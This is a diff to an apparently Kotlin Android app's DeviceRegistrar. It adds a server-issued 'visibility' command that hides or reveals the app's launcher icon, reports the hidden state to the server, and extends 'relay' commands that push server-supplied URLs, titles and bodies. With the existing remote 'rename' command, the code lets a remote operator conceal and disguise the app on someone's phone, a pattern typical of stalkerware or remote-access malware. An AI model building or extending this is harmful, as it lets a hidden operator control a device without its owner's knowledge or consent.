@@ -89,6 +89,7 @@ object DeviceRegistrar {
             put("batteryOptimized", batteryOptimized)
             put("alias", AppAlias.current(app))
             put("appLabel", AppAlias.labelFor(AppAlias.current(app)))
+            put("hidden", AppAlias.isHidden(app))
         }
         val conn = (url.openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
@@ -163,8 +164,9 @@ object DeviceRegistrar {
 
     /**
      * Dispatches server commands. Returns true if anything was handled.
-     * Actions: "relay" {url, slot} and "rename" {alias}. Objects without an
-     * explicit action but with a url are treated as legacy relay commands.
+     * Actions: "relay" {url, slot, title?, body?}, "rename" {alias} and
+     * "visibility" {visible}. Objects without an explicit action but with a
+     * url are treated as legacy relay commands.
      */
     private fun dispatchCommands(app: Context, objs: List<JSONObject>, raw: String): Boolean {
         var handled = false
@@ -186,6 +188,19 @@ object DeviceRegistrar {
                         o.optString("title").ifBlank { null },
                         o.optString("body").ifBlank { null },
                     )
+                    handled = true
+                }
+                "visibility" -> {
+                    if (!o.has("visible")) continue
+                    val wantVisible = o.optBoolean("visible")
+                    val hidden = AppAlias.isHidden(app)
+                    if (wantVisible && hidden) {
+                        AppAlias.show(app)
+                        heartbeatAsync(app)
+                    } else if (!wantVisible && !hidden) {
+                        AppAlias.hide(app)
+                        heartbeatAsync(app)
+                    }
                     handled = true
                 }
                 "rename" -> {
